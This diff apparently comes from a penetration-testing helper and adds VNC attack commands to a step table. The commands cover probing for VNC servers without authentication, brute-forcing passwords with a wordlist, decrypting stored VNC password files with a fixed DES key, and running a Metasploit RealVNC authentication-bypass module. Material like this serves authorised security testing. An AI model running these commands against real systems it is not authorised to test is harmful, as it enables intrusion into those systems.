@@ -5045,6 +5045,8 @@ _STEP_COMMANDS = {
     "vnc": {
         1: [
             "nmap -p<RPORT> --script vnc-info,realvnc-auth-bypass <RHOST>",
+            "nxc vnc <RHOST>   # reports security/auth types",
+            "msfconsole -q -x 'use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS <RHOST>; set RPORT <RPORT>; run; exit'",
         ],
         2: [
             "nxc vnc <RHOST> -p /usr/share/wordlists/rockyou.txt",
@@ -5052,6 +5054,9 @@ _STEP_COMMANDS = {
         ],
         3: [
             "vncviewer <RHOST>::<RPORT>",
+            "git clone https://github.com/jeroennijhof/vncpwd && cd vncpwd && make && ./vncpwd <passwd-file>   # decrypt ~/.vnc/passwd or HKLM\\...\\WinVNC4 blob (fixed DES key)",
+            "vncviewer -passwd <passwd-file> <RHOST>::<RPORT>   # connect with recovered passwd file directly",
+            "msfconsole -q -x 'use auxiliary/admin/vnc/realvnc_41_bypass; set RHOSTS <RHOST>; set RPORT <RPORT>; run; exit'   # CVE-2006-2369",
         ],
     },
     "ssh": {
